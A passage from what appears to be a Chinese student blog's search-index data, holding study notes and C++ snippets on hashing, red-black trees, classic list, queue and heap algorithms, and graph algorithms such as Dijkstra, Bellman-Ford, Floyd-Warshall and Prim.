折叠法\n![image.png](https://pic.moyuin.top/2025/05/13/6822bad72914b.png)\n\n#### 除留余数法\n![image.png](https://pic.moyuin.top/2025/05/13/6822bb08893b4.png)\n\n#### 随机数法\n注意随机一定要真随机，设置好 seed 随机种子。\n\n![image.png](https://pic.moyuin.top/2025/05/13/6822bb403f316.png)\n\n散列表的绘制之后补充。\n\n## 红黑树\n### 红黑树的五条核心规则\n\n1. 每个节点要么是**红色**，要么是**黑色**。\n2. 根节点永远是**黑色**。\n3. 所有叶子节点（NIL/空节点）都是**黑色**的。\n4. **红色**节点的子节点必须是**黑色**的。（即不能有两个连续的红色节点）\n5. 从任一节点到其所有后代叶子节点的路径上，**黑色**节点的数量都相同。\n\n**插入策略**：新插入的节点**总是红色**的。然后通过“变色”和“旋转”来修复可能违反的规则。\n\n### 修复违规的“小抄”\n\n当你插入一个**红色**新节点 `N`，发现它的父节点 `P` 也是**红色**时（违反了规则4），你只需要看它**叔叔节点 `U` 的颜色**：\n\n- **情况1：叔叔 `U` 是红色**\n    - **操作**：**变色**。将父节点 `P` 和叔叔 `U` 变为**黑色**，将祖父节点 `G` 变为**红色**。然后将祖父节点 `G` 当作新的插入点，继续向上检查。\n- **情况2：叔叔 `U` 是黑色（或NIL/空节点）**\n    - **操作**：**旋转+变色**。这又分为两种：\n        - **直线型 (LL / RR)**：直接对祖父节点 `G` 进行旋转，然后将 `P` 和 `G` 变色。\n        - **三角型 (LR / RL)**：先对父节点 `P` 进行旋转，变成直线型，然后再按直线型处理。\n","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"数据结构-经典算法设计（期中备考用）","url":"/2025/04/14/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-jing-dian-suan-fa-she-ji-qi-zhong-bei-kao-yong/","content":"# 数据结构-经典算法设计（期中备考用）\n\n每个算法都有简单的思路，但并非算法思想，只是记录一些经典的算法设计。\n\n---\n## 1. 合并两个有序链表\n### 题目描述\n写一个函数，将两个升序链表合并成一个新的升序链表，返回新链表的头指针。\n### 算法步骤\n1. 创建一个结点 dummy（头指针占位）。\n2. 使用一个指针 `tail` 指向合并链表的末尾。\n3. 每次比较两个链表当前节点的值，将较小的一个链接到 `tail`。\n4. 将 `tail` 向后移动，源链表指针也前进。\n5. 当一个链表走完后，将另一个链表剩余部分直接接到 `tail` 后面。\n```cpp\nstruct ListNode {\n    int val;\n    ListNode* next;\n    ListNode(int x) : val(x), next(nullptr) {}\n};\n//结构体构建，可写可不写，最重要的是下面的这个算法函数。\n\n\nListNode* merge(ListNode* l1, ListNode* l2) {\n    ListNode dummy(0), *tail = &dummy;\n    while (l1 && l2) {\n        if (l1->val < l2->val) tail->next = l1, l1 = l1->next;\n        else tail->next = l2, l2 = l2->next;\n        tail = tail->next;\n    }\n    tail->next = l1 ? l1 : l2;\n    return dummy.next;\n}\n```\n\n时间复杂度：`O(m + n)`，m 和 n 是两个链表的长度\n空间复杂度：`O(1)`（原地合并，不开额外数组）\n\n---\n## 2. 用栈实现队列\n### 题目描述\n使用两个栈实现一个队列的入队和出队操作。\n\n### 算法步骤\n用两个栈 `in` 和 `out`：\n- 入队时直接压入 `in`\n- 出队时：\n    - 若 `out` 非空，直接弹出\n    - 若 `out` 为空，将 `in` 所有元素倒入 `out`，再弹出\n```cpp\nclass MyQueue {\nprivate:\n    stack<int> inStack, outStack;\n\n    void transfer() {\n        while (!inStack.empty()) {\n            outStack.push(inStack.top()); //把入栈倒入出栈\n            inStack.pop();\n        }\n    }\n\npublic:\n//这里其实也只要写push和pop函数，记得把transfer函数套到pop里即可。\n    void push(int x) {\n        inStack.push(x);\n    }//压入队列\n\n    void pop() {\n        if (outStack.empty()) transfer();\n        if (!outStack.empty()) outStack.pop();\n    }//弹出队列\n\n    int front() {\n        if (outStack.empty()) transfer();\n        return outStack.top();\n    }\n\n    bool empty() {\n        return inStack.empty() && outStack.empty();\n    }\n};\n\n\n```\n\n时间复杂度：`O(1)` 每个元素最多被移动两次。\n空间复杂度： `O(n)` 两个栈，最多 n 个元素在栈中。\n\n---\n## 3. 队列模拟任务调度\n### 题目描述\n队列中每个任务有一个编号，顺序入队，按顺序处理。可能会出现“插队”（比如优先任务）。模拟这个过程。\n\n**一些常见题目变形**\n-  循环队列实现多进程\n-  某任务执行完后重新入队（多轮轮转）\n-  实现带优先级的调度（双端队列 / 优先队列）\n### 基本思路\n- 普通调度：使用普通队列 `queue<T>`\n- 插队：用 `deque<T>`，高优先级任务从队首插入\n- 模拟时间片轮转：每次处理一个任务，将其放回队尾\n```cpp\n//这个是没有插队的普通版本\nvoid simulateQueue(vector<int>& tasks) {\n    queue<int> q;\n\n    for (int t : tasks) {\n        q.push(t);  // 初始入队\n    }\n\n    while (!q.empty()) {\n        int current = q.front(); q.pop();\n        // 假设部分任务重新排入队尾\n        if (current % 2 == 0) {\n            q.push(current);  // 模拟需要再次处理\n        }\n    }\n} \n\n//这个使用插队，需要使用双端队列，让任务可以push的时候直接到push_front()\nvoid simulateTaskQueue(const vector<Task>& tasks) {\n    deque<int> q;\n\n    for (const Task& task : tasks) {\n        if (task.urgent) { \n        //如果任务优先为true\n            q.push_front(task.id);  // 插队\n        } else {\n            q.push_back(task.id);   // 正常排队\n        }\n    }\n\t//当然也可以在出队上用做文章，不过这里不多写了，怕有bug\n    while (!q.empty()) {\n        int current = q.front(); q.pop_front();\n        \n         if (current % 2 == 0) {\n            q.push(current);  // 模拟需要再次处理\n        }\n    }\n}\n\n```\n使用STL的话，时间复杂度只是`O(1)` 而已。\n\n当然，如果题目涉及任务有权重什么的，一般我们实现是直接用 STL 的 priority_queue...不过这里也提供 heap 的算法模拟，最大堆。*这种涉及数学方法分割的我一般都不怎么会...*\n```cpp\nvoid down(int i) { // 下滤\n    int t = i;\n    if (2 * i <= heapSize && heap[2 * i] > heap[t]) t = 2 * i;\n    if (2 * i + 1 <= heapSize && heap[2 * i + 1] > heap[t]) t = 2 * i + 1;\n    if (t != i) {\n        swap(heap[i], heap[t]);\n        down(t);\n    }\n}\n\nvoid up(int i) { // 上滤\n    while (i > 1 && heap[i] > heap[i / 2]) {\n        swap(heap[i], heap[i / 2]);\n        i /= 2;\n    }\n}\n\nvoid insert(int x) {\n    heap[++heapSize] = x;\n    up(heapSize);\n}\n\nvoid pop() {\n    heap[1] = heap[heapSize--];\n    down(1);\n}\n\n```\n\n---\n## 4. 中序 + 后序构造二叉树，输出层序遍历\n\n这道题其实还可以类比那些知道中序+前序遍历求后序遍历的题目，可以见经典的 [洛谷 P1827](https://www.luogu.com.cn/problem/P1827)这类题型。\n\n### 基本思路\n- 后序的最后一个元素是当前根节点\n- 在中序中找到这个根节点的位置，这个根节点左侧是左子树所有节点，右侧是右子树所有节点\n- 使用递归构建左右子树\n- 构建完毕后使用 `queue`进行简单的入队push出队pop来递归层序遍历。\n\n```cpp\n//还原树\nTreeNode* buildTreeHelper(vector<int>& in, vector<int>& post, int inL, int inR, int postL, int postR) {\n    if (inL > inR) return nullptr;\n\n    int rootVal = post[postR];\n    TreeNode* root = new TreeNode(rootVal);\n\n    int k = inL;\n    //如果是string的话，我们直接可以str.find(rootVal)找到中序遍历中根节点的位置。\n    //这和那道 p1827 思路其实是一致的。\n    while (in[k] != rootVal) ++k;\n    int leftSize = k - inL;\n\n    root->left = buildTreeHelper(in, post, inL, k - 1, postL, postL + leftSize - 1);\n    root->right = buildTreeHelper(in, post, k + 1, inR, postL + leftSize, postR - 1);\n\n    return root;\n}\n\n//层序遍历\nvoid levelOrder(TreeNode* root) {\n    if (!root) return;\n    queue<TreeNode*> q;\n    q.push(root);\n    while (!q.empty()) {\n        TreeNode* cur = q.front(); q.pop();\n        cout << cur->val << \" \";\n        if (cur->left) q.push(cur->left);\n        if (cur->right) q.push(cur->right);\n    }\n    cout << endl;\n}\n\n```\n时间复杂度： `O(n)` 构建二叉树和层序遍历都是访问树所有节点，因此时间复杂度一致。\n空间复杂度： `O(n)`\n\n---\n**更新施工中...**","tags":["学习","数据结构","编程"],"categories":["日常学习","数据结构"]},{"title":"数据结构-图","url":"/2025/04/08/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-tu/","content":"# 数据结构-图\n\n图就是一群**点与点之间的连接关系**。\n\n> 图 = 点 + 关系\n\n我们一般利用矩阵对它进行计算。\n## 图的术语\n图的术语很多很多，分类记忆优先。\n### **一类：必须掌握，写代码会直接用到的术语**\n这些术语不仅是定义，更是写代码、分析题目的关键词\n\n| 术语                | 意义                                |\n| ----------------- | --------------------------------- |\n| **有向图 / 无向图**     | 箭头 vs 无箭头，影响建边方式（`add(u,v)` 是否对称） |\n| **邻接（Adjacency）** | 一个点相邻的所有点，用于 DFS / BFS            |\n| **出度 / 入度 / 度**   | 出去多少条边、进来多少条边，图遍历/拓扑排序常用          |\n| **加权图**           | 边有权值了，要用 `edge.to, edge.w` 来写     |\n| **简单路径 / 简单环**    | 不重复点的路径 / 环，DFS 搜索路径时要判断          |\n| **子图**            | 原图的一部分，图论算法经常讲“找子图”               |\n\n### **二类：理解了就能用的术语**\n这些术语不是写代码的前提，但出现在算法分析里，比如题干说“强连通分量”，得知道那是啥\n\n|术语|建议|\n|---|---|\n|**连通图 / 强连通图**|DFS/BFS 一遍能走完 vs 每个点都能互相到达|\n|**连通分量 / 强连通分量**|把图分成“互相能到达的块”|\n|**极大连通子图**|不能再扩展的连通分量，Tarjan算法中会用|\n|**网络（flow network）**|用于网络流，前期接触少，可以见到再查|\n|**回路 / 环 / 简单环**|DFS 检测环判断用，图论题会提到|\n\n 画成图理解，有题再回笔记复习，不需要死记硬背术语。\n 让G老师整理了一个简略的模板，复制粘贴一下。\n \n ### 图论术语学习笔记，仅供查阅\n\n| 术语       | 中文解释                             | 图论举例              | 代码意义 / 使用场景               |\n| -------- | -------------------------------- | ----------------- | ------------------------- |\n| 有向图      | 边有方向，A→B 与 B→A 不同                | A → B → C         | 邻接表只存 u→v，不加反边            |\n| 无向图      | 边无方向，A-B 是双向的                    | A - B - C         | 建边要加两次 u↔v                |\n| 邻接       | 某个点能直接到达的点                       | A 相邻点为 B, C       | DFS / BFS / 最短路核心         |\n| 入度       | 进入该点的边数                          | C 有入度 2：A→C, B→C  | 拓扑排序判断是否入度为 0             |\n| 出度       | 从该点出发的边数                         | A 有出度 1：A→B       | 构建邻接表或最短路用                |\n| 度        | 无向图中与该点相连的总边数                    | B 有度 3：连了 A, C, D | 统计图结构复杂度                  |\n| 加权图      | 每条边有权重值（如距离、代价）                  | 边 A→B 权重为 3       | 需要额外记录权重 edge.w           |\n| 简单路径     | 路径中点不重复                          | A→B→C 合法          | DFS 中用 visited[] 防止重复     |\n| 简单环 / 回路 | 点不重复的闭环                          | A→B→A 是简单环        | 判断是否有环                    |\n| 子图       | 图的一部分（点与边的子集）                    | G 的子图仅含 A, B, C   | 大图中划分子问题                  |\n| 连通图      | 任意两个点之间有路径                       | 一笔能走完所有点          | 用 DFS / BFS 判断连通性         |\n| 强连通图     | 有向图中任意两点互达                       | 所有点之间都有双向路径       | Tarjan 算法中强连通分量（SCC）判定    |\n| 连通分量     | 连通图中独立的“块”                       | 一个图被分成多个连通子图      | 并查集找连通块 / 统计图中有几个分量       |\n| 强连通分量    | 强连通图中的“极大块”                      | Tarjan 算法识别强连通部分  | 拆图结构、题目要求找 SCC 时使用        |\n| 极大连通子图   | 无法再扩展的连通图                        | 一次 DFS 得到的整块      | 判最大图结构 / DFS 局部图遍历        |\n| 极小连通子图   | 包含所有点、最少边的连通图，去掉一条边就不连通，增加一条边就成环 | 原图有环，生成树去掉了冗余边    | 用来描述 MST 的性质/写题时判断图是否成树常用 |\n| 网络（flow） | 带容量限制的有向图                        | 边 A→B 最大流 5       | 最大流 / 最小割等网络流建模           |\n\n---\n## 比较\n线性、树、图结构中\n- 线性结构中，每个元素只有**一个直接前驱和直接后继**。\n- 树形结构中，每个元素中有**一个直接前驱**，但可以有**多个直接后继**。\n- 图形结构中，数据元素之间的关系任意。每个元素可以和任意多个数据元素相关，有任意多个直接前驱和直接后继。*（在无向图中，在有向图视角下甚至互为前驱后继）*\n---\n## 实现\n### ADT的C++类表示\n>`Graph` 是一个支持添加边、遍历（DFS/BFS）、获取邻接点的抽象图结构。  \n   支持有向图和无向图的建图形式，底层使用邻接表实现。适合作为图论算法的基础类。\n   \n```cpp\n// 图的抽象数据类型（ADT）结构表示\nclass Graph {\nprivate:\n    int V; // 顶点数量\n    bool directed; // 是否为有向图\n    vector<vector<int>> adj; // 邻接表表示图\n\npublic:\n    // 构造函数：初始化图的顶点数量与有向/无向标志\n    Graph(int vertices, bool isDirected = false) {\n        V = vertices;\n        directed = isDirected;\n        adj.resize(V);\n    }\n\n    // 添加一条边（u 到 v）\n    void addEdge(int u, int v) {\n        adj[u].push_back(v);\n        if (!directed) {\n            adj[v].push_back(u); // 无向图加双向边\n        }\n    }\n\n    // 获取一个点的所有邻接点\n    vector<int> getNeighbors(int u) {\n        return adj[u];\n    }\n\n    // 深度优先遍历（DFS）\n    void DFS(int start, vector<bool>& visited) {\n        visited[start] = true;\n        for (int v : adj[start]) {\n            if (!visited[v]) {\n                DFS(v, visited);\n            }\n        }\n    }\n\n    // 广度优先遍历（BFS）\n    void BFS(int start) {\n        vector<bool> visited(V, false);\n        queue<int> q;\n        q.push(start);\n        visited[start] = true;\n        while (!q.empty()) {\n            int u = q.front(); q.pop();\n            for (int v : adj[u]) {\n                if (!visited[v]) {\n                    visited[v] = true;\n                    q.push(v);\n                }\n            }\n        }\n    }\n\n    // 获取图中顶点数量\n    int getVertexCount() const {\n        return V;\n    }\n\n    // 获取图中某点的度数（无向图）或出度（有向图）\n    int getDegree(int u) const {\n        return adj[u].size();\n    }\n};\n\n```\n### 存储\n图的存储用于存储点和边的关系，主要有2种方法。\n- 邻接矩阵：用一个二维表格记录“有没有边”\n- 邻接表：每个点有一张自己的“出边名单”\n#### 邻接矩阵（二维数组）\n- 适合小图，构造简单直接。有几个顶点就存几个方向。\n- **在一维数组里面存储顶点信息，二维矩阵中存储边的信息**。\n- 用一个二维数组 `g[i][j]` 表示\n\t有边：`g[i][j] = 1`（或权值 w）\n\t没边：`g[i][j] = 0`（或 INF，无穷大)\n\t\n![](/images/数据结构-图/20250325111944762.png)\n对于**稠密图，有向图**，采用邻接矩阵非常合适。但存储大量无边信息，造成空间浪费。\n*这个很好构造，创一个二维数组，赋值关系间就好。比如1号元素指向2号元素，权值为2，则*  `g[1][2]=2` \n对于一些有权图问题，我们为了代码能跑，经常会设置INF，辅助最小路径问题，这样输入也方便\n```cpp\nif (graph[i][j] == 0 && i != j) graph[i][j] = INF;\n```\n\n#### 邻接表\n邻接表的实现和邻接矩阵很像，但不约束于邻接矩阵`n*n`的固定大小。\n每一个顶点使用一个**一维数组**来存储，而边的存储是同一个顶点出发的所有边，组成**一条单链表**。\n我们用 STL 实现的话，vector 的 push_back() 很好的起到了邻接表的实现来存储图。邻接表就是链表式的图结构。\n当然也可以直接用链表，跳转。\n![](/images/数据结构-图/20250325113155345.png)\n对于**稀疏图，无向图**，采用邻接表非常合适。空间利用效率大幅度提高，不存储无边的无用信息。\n##### STL 实现\n**无权图版本**\n```cpp\n//基本结构\nconst int N = 10010; // 最大点数\nvector<int> graph[N]; // 邻接表：graph[u] 存放 u 的邻接点\n\n//加边操作\nvoid addEdge(int u, int v) {\n    graph[u].push_back(v);\n    graph[v].push_back(u); // 无向图要加两次\n}\n\n//遍历\nfor (int v : graph[u]) {\n    // u → v 有一条边\n}\n//非常类似链表遍历，每个点自己的链表就是vector\n```\n**有权图版本**\n\n```cpp\nvector<pair<int, int>> graph[N]; // pair<to, weight>\n\nvoid addEdge(int u, int v, int w) {\n    graph[u].push_back({v, w});\n    // 如果是无向图：\n    // graph[v].push_back({u, w});\n}\n\nfor (auto [v, w] : graph[u]) {\n    // u → v, 权重为 w\n}\n\n\n```\n ##### **链表实现**\n ```cpp\n struct Graph {\n    struct Node {//边的构造\n        int to;           // 边通往哪个点\n        Node* next;       // 还有没有其他边从该店出去\n    };\n\n    Node* head[N];        // 图的点对应的边，是数组\n};\n\nvoid addEdge(int from, int to) {\n    Node* newNode = new Node{to, head[from]};\n    head[from] = newNode;\n}\n//插入边\n```\n\n> “如果一个点有很多出边怎么办？如果没有出边怎么办？”\n\n那我们就反向思维，我们链表存储的是**图的边**，并非图的所有点。点可以对应很多边，但边可以对应只有两个点。而且我们图的关系，看的往往是边的关系。\n- 顶点编号 = `head[i]` 中的 `i`\n- 边 = 存在于从 `i` 出发的一串 `Node`\n- `to` 指向的是该边的到达点，出发点就是插入这条边的时候所在的下标。\n\n插入边直接 addEdge(1,2)，插入一条从1指向2的边。我们每一次构造都是插入 Node 。\n `head[from] = newNode` 表面上是赋值，  \n但这行代码背后的意义是：\n\n> 把新的边插在原链表的最前面，原来的边通过 `newNode->next` 继续挂在后面。\n\n建立新节点的时候 `new node{to,head[from]}` 把旧的链表接在新边后面，**实现了“头插法”追加”**。\n\n---\n## 遍历\n遍历图和遍历二叉树不太一样，图的每个顶点地位相同，我们要判断“一个点是否被访问过”，避免遗漏。\n\n### DFS\n*其实感觉有点像开 bool 数组呢...*\n深度优先遍历。\n![](/images/数据结构-图/20250401110553640.png)\n**访问方式**：\n- 从选中的某一个未访问过的顶点出发，访问并对该顶点加已访问标志。\n- 依次从该顶点的未被访问过的第1个、第2个、第3个…… 邻接顶点出发，依次进行**深度优先遍历**，即转向1。\n- 如果还有顶点未被访问过，选中其中一个顶点作为起始顶点，再次转向1。如果 所有的顶点都被访问到，遍历结束。\n简单点就是，一条路一直走，走到头，栈式回退，一层层卸载。\n**注意：** \n- 深度优先遍历结果不唯一。\n- DFS 是一个典型的**递归过程**，用对规模小的图的遍历问题解决大图遍历问题。\n**实现**：\n深度优先，就是开bool数组吧...递归只要做到”来过“就可以了。\n\n从指定点开始深度优先遍历，我们先把一个点变成 true ，从它开始...\n```cpp\nvoid DFS(Graph G, int v, bool visited[]) {\n    visited[v] = true;         // 标记当前点已访问\n    for (每一个与 v 相邻的顶点 u) {\n        if (!visited[u]) {\n            DFS(G, u, visited);  // 递归访问未访问的邻居\n        }\n    }\n}\n\n```\n\n### BFS\n广度优先遍历。\n![](/images/数据结构-图/20250401110701225.png)\n**访问方式**：\n- 从选中的某一个未访问过的顶点出发，访问并对该顶点加已访问标志。\n- 依次对该顶点的未被访问过的第1个、第2个、第3个……第 k 个邻接点 v1、v2 、v3…… vk进行访问且加已访问标志。\n- 依次对顶点 v1 、v2、v3…… vk转向操作2。\n- 如果还有顶点未被访问过，选中其中一个顶点作为起始顶点，再次转向1。如果 所有的顶点都被访问到，遍历结束。\n\n> 与深度优先不太一样的是，广度优先像是 “访问邻居“，确保从一个点出发，所有与该点连接的点都遍历到，然后再跳转下一点。\n\n**注意**：\n- 广度优先遍历结果不唯一。\n- **广度优先遍历不是递归过程**，它更像是一个对点的逐个访问。\n**实现**：\n```cpp\nvoid BFS(Graph G, int start, bool visited[]) {\n    queue<int> q;\n    visited[start] = true;\n    q.push(start);  // 起点入队\n\n    while (!q.empty()) {\n        int v = q.front(); q.pop();   // 取出当前点\n        for (每一个与 v 相邻的顶点 u) {\n            if (!visited[u]) {\n                visited[u] = true;    // 标记为已访问\n                q.push(u);            // 邻居入队\n            }\n        }\n    }\n}\n\n```\n\n## 应用\n### 最短路径问题（Dijkstra，Bellman-Ford，Floyd-Warshall）\n**定义**：在最短路径问题中，给定一个带有权值的有向图 G=(V,E)，令w(u,v)表示边(u,v)的权值。图中一条路径p=<v_0,v_1,...,v_k>的权值w(p)是构成该路径的所有边的权值之和，在所有的从顶点u到顶点v的路径当中，权值最小的那条路径称之为从u到v的最短路径。\n*说白了就是每次都走权值最大or最小的路径。最后整条路径是权值最大or最小的。*\n\n**重要性质**：给定两个顶点之间的一条最短路径，则在该路径上任意两个点的路径都是最短的，这种最短子路径称为最优子结构。\n*一条大路是最优解，那么每条小路都是最优解。*\n\n我们用动态规划，Dijkstra算法的基础，就是基于这个“每条小路最优解”。\n#### 问题： 一条最短路径能包含环路吗？\n答：**不能。绝不行。不管环的权值是负的、正的，还是零，全都不行。**\n##### 如果环的权值是负数 (这玩意最危险）\n假设你从 A 出发，走到某个地方遇到了一个负权环，也就是说，这个环越绕越“省钱”。\n那干嘛不在这个环里绕一百万圈，搞个负无穷大？你这什么最短路径，明明还可以更短！\n只要**图里能从起点走到一个负权环，那你永远也找不到真正的最短路径**，\n结论：负权环 = 最短路径永远没完没了。\n\n##### 如果环的权值是正数（这玩意没啥用）\n你走了一条路，中间绕了个小贵环回来，然后再继续走。  \n那你为啥要走那个贵环？你删掉它不是省更多？\n**只要路径里有正权环，你都可以删掉它，剩下的路更短。**\n结论：正权环 = 拖后腿，没必要。\n\n##### 如果环的权值是 0（ 这玩意最容易骗你）\n你以为走这个 0 环“也没多付钱啊”，那可太天真了。  \n虽然它不会让路径更差，但它也不会让路径更好，  \n**而且它让你走了一圈纯属浪费感情。**\n结论：0 权环 = 没损失但也没价值，是废环，删了也不影响最短路径。\n\n#### Dijkstra算法\n手写作业写最短路径的时候，按教材那个表达来。\n遍历+贪心。\n流程：\n- Dijkstra 每一轮都更新「从源点到某节点的所有可能路径」，**只取当前最短那一条**，**并不是**依赖于上一条选好的线路而贪心增加。（比如选好了<4,2,3>是4到3最短，再看4到6的时候，除了要看<4,2,3,6>,可能还要看<4,6>,<4,2,6>等等...）\n\n实例：\n\t![题目](https://img.moyuin.top/i/2025/04/21/6806420d215bc.png)\n*顺便给一下教材写法，考试格式...*\n![image.png](https://img.moyuin.top/i/2025/04/21/680644fd78993.png)\n\n\n- 标记（舍）是因为比已知存在路径要权重大，因此不作为下个未标记点的路径。\n\n|       终点        | i=1       | i=2        | i=3            | i=4         | i=5           |\n| :-------------: | :-------- | :--------- | :------------- | :---------- | :------------ |\n|        1        | ⟨4,1⟩20   | ⟨4,2,1⟩15  |                | ⬛ ⟨4,6,1⟩12 |               |\n|        2        | ⬛ ⟨4,2⟩5  |            |                |             |               |\n|        3        |           | ⬛ ⟨4,2,3⟩8 |                |             |               |\n|        5        | ⬛ ⟨4,5⟩11 |            | ⟨4,2,3,5⟩23(舍) | ⟨4,6,5⟩13   |               |\n|        6        | ⬛ ⟨4,6⟩10 |            |                |             |               |\n|  u(选好的最短路径节点)   | 2         | 3          | 6              | 5           | 1             |\n| s(已确定最短路径的节点集合) | {4,2}     | {4,2,3}    | {4,2,3,6}      | {4,2,3,6,5} | {4,2,3,6,5,1} |\n 最终结果（最短路径）：\n- v1：⟨4,6,1⟩，dist=12\n- v2：⟨4,2⟩，dist=5\n- v3：⟨4,2,3⟩，dist=8\n- v5：⟨4,5⟩，dist=11\n- v6：⟨4,6⟩，dist=10\n\n代码实现（这里是把所有点到点的距离全部计入了）：\n```cpp\nvoid dijkstra(int n, int start, vector<vector<int>>& graph) {\n    vector<int> dist(n, INF);     // 存储起点到各点的最短距离\n    vector<bool> visited(n, false); // 标记哪些点已经确定最短路径\n\n    dist[start] = 0; // 起点到自己的距离是0\n\n    for (int i = 0; i < n; i++) {\n        int u = -1;\n        int minDist = INF;\n\n        // 找当前未访问的点中，距离起点最近的那个\n        for (int j = 0; j < n; j++) {\n            if (!visited[j] && dist[j] < minDist) {\n                u = j;\n                minDist = dist[j];\n            }\n        }\n\n        if (u == -1) break; // 如果没找到说明剩下的都不可达，结束\n\n        visited[u] = true; // 标记这个点已经确定最短路径\n\n        // 更新与u相邻的点的距离\n        for (int v = 0; v < n; v++) {\n            if (!visited[v] && graph[u][v] != INF) {\n                if (dist[u] + graph[u][v] < dist[v]) {\n                    dist[v] = dist[u] + graph[u][v];\n                }\n            }\n        }\n    }\n\n    // 输出结果\n    for (int i = 0; i < n; i++) {\n        if (dist[i] == INF)\n            cout << \"从\" << start << \"到\" << i << \"：不可达\" << endl;\n        else\n            cout << \"从\" << start << \"到\" << i << \"：最短距离 = \" << dist[i] << endl;\n    }\n}\n\n```\n\n---\n#### Bellman-Ford算法\n**核心思想**：Bellman-Ford算法通过对边进行**松弛的方式**渐近地求出**源顶点s到其余顶点v**的最短路径距离。\n- **Dijkstra 不支持负权边**（就是边的权值可以是负数）\n- **Bellman-Ford 可以！**\n>Bellman-Ford 的核心机制就是：\n> **“你别急，我帮你把路径松弛 V-1 次。”**\n>啥叫“松弛”？不是拉筋，是更新路径：\n\n每次松弛，就是尝试：\n\n> “如果从 A 到 B 这条边能让 B 的最短距离更小，我就更新一下到达 B 的最短距离。”\n\n你把图里所有边一遍一遍扫，  \n每发现能更新的路径，就更新。  \n重复这个过程 **V-1 次**（V = 点的数量）。\n\n因为最短路径最多经过 V-1 条边，  \n再多就是环了，你就绕圈圈了。\n> “如果我松弛了 V-1 次还没完，  \n> 第 V 次还能继续更新，那说明你有 **负权环**，无限省钱大骗局，整个图炸了。”\n\n代码实现：\n```cpp\nbool bellmanFord(int n, int start, vector<Edge>& edges, vector<int>& dist) {\n    dist.assign(n, INF);\n    dist[start] = 0;\n\n    // 进行 n-1 次松弛操作\n    for (int i = 0; i < n - 1; i++) {\n        for (auto edge : edges) {\n            if (dist[edge.u] != INF && dist[edge.u] + edge.w < dist[edge.v]) {\n                dist[edge.v] = dist[edge.u] + edge.w;\n            }\n        }\n    }\n\n    // 第n次松弛，检测是否还有可以更新的——有就代表存在负权回路\n    for (auto edge : edges) {\n        if (dist[edge.u] != INF && dist[edge.u] + edge.w < dist[edge.v]) {\n            return false; // 有负权环\n        }\n    }\n\n    return true; // 成功，没有负权环\n}\n```\n有负权环没答案。答案存在 dist 数组里。\n\n---\n#### Floyd-Warshall算法\n**算法介绍**：Floyd-Warshall算法是一种动态规划算法，能解决**所有顶点对最短路径**问题，运行时间为O(|V|^3)，能够处理权值为负的边。\n**代码更短。**\n\n**核心思想**：如果你想让 i 到 j 更短，那试试看从 i 到 k 再到 j 会不会更便宜。\n> 你有一张图，任意两点之间的最短路径你都想知道，一个一个试太累，那你干脆：  \n>**让每个点都轮流当“中转站”，看看是不是能让两点之间的距离变短。**\n\n**本质**：\n你要更新的路径是 `dist[i][j]`，  \n每当你发现：\n`dist[i][j] > dist[i][k] + dist[k][j]`\n\n你就做一次松弛\n`dist[i][j] = dist[i][k] + dist[k][j];`\n\n代码不太优雅：\n*从 i 到 j，如果我中转一下 k，是不是更便宜？*\n```cpp\nfor (int k = 1; k <= n; ++k)  // 中转点\n    for (int i = 1; i <= n; ++i)    // 起点\n        for (int j = 1; j <= n; ++j)// 终点\n            if (dist[i][j] > dist[i][k] + dist[k][j])\n                dist[i][j] = dist[i][k] + dist[k][j];\n\n```\n不能有负环，否则结果会出事（无限套现）。\n\n---\n### 最小生成树（最小支撑树）问题（生成MST）\n**定义**：给定一个连通的加权图G=(V,E)，其中V为顶点的集合，E为边的集合，其中E中的每条边都有一个非负的权值。最小生成树问题是在G中**求解权值最小的生成树**（MST）。\n#### Prim算法\n是一个贪心算法，构造树的时候，每次都是选择权值最小的路径连接点与点。\n一个点出发，慢慢往外连边，每次都选：\n> **“从已经连接好的点，到外面去的边中，最短的那一条。”**\n\nprim算法和Dijkstra算法的思想很像很像，不过一个是关注**单纯点到点的路径的权值**，一个是关注**从源点到该点的路径和**。也要注意保留**未选取路径中指向未选取点的**。\n\n\n照样**不能去成环**，理由和最短路径的那个一样的。\n##### 代码实现：\n- 代码总览：(邻接矩阵实现)\n```cpp\n#include <iostream>\n#include <vector>\n#include <climits>\n\nusing namespace std;\n\nconst int INF = INT_MAX;\nconst int N = 100; // 最大顶点数\n\nint graph[N][N]; // 邻接矩阵\nvector<bool>visited(N,false); // 标记是否加入MST，哪些点已经被我们选了\nvector<int>dist(N,INF)     // 到MST的最小边权值，初始每个点都贵得离谱\nint n;           // 顶点数量\n\nint prim(int start) {\n\n    dist[start] = 0;\n    int totalWeight = 0;\n\n    for (int i = 0; i < n; i++) { \n    //给每一个点找最便宜的权值,处理后加上去\n        int u = -1, minDist = INF;\n        //从还没选的点中选一个最便宜的\n        for (int j = 0; j < n; j++) {\n            if (!visited[j] && dist[j] < minDist) {\n                minDist = dist[j];\n                u = j;\n            }\n        }\n\n        if (u == -1) break; // 找不到了，说明不连通\n\n        visited[u] = true; // 找到了，标记一下，下次不选它了，不然有可能形成环路\n        totalWeight += dist[u]; // 加一下找到的u点出发最短权值\n\n        // 更新从点 u 出发可以到达的，但还没去过的其他点的，权值，便于下次选择最短路径\n        for (int v = 0; v < n; v++) {\n            if (!visited[v] && graph[u][v] < dist[v]) { \n\t        //v 点我还没去过，并且我发现u到v点的路径比我一开始设定的minDist还要短，那我就把它改成u到v的边，调整一下\n                dist[v] = graph[u][v];\n            }\n        }\n    }\n\n    return totalWeight; // 输出最短路径\n}\n\n```\n- 输入格式（邻接矩阵，邻接表实现其实要麻烦一些，要遍历表找最值）\n```cpp\nint n;\ncin >> n;\nvector<vector<int>> graph(n, vector<int>(n));\n\nfor (int i = 0; i < n; i++) {\n    for (int j = 0; j < n; j++) {\n        cin >> graph[i][j];\n        if (graph[i][j] == 0 && i != j) graph[i][j] = INT_MAX; // 无边当作 ∞\n    }\n}\n```\n**Prim 算法遍历邻接矩阵所有点**，平均时间复杂度为O(n^2)。\n\n- 邻接表实现：\n```cpp\n #include <iostream>\n#include <vector>\n#include <queue>\nusing namespace std;\n\nstruct Edge {\n    int to, weight;\n    bool operator>(const Edge &e) const {\n        return weight > e.weight;  // 小根堆\n    }\n};\n\nconst int N = 1001; //顶点最大个数\nvector<Edge> graph[N]; //图，邻接表表示的，数组索引i表示是第i个节点，存的是边链表的头\nbool visited[N];\n\nint prim(int start) {\n    priority_queue<Edge, vector<Edge>, greater<Edge>> pq;\n    visited[start] = true;\n\n    for (auto &e : graph[start]) 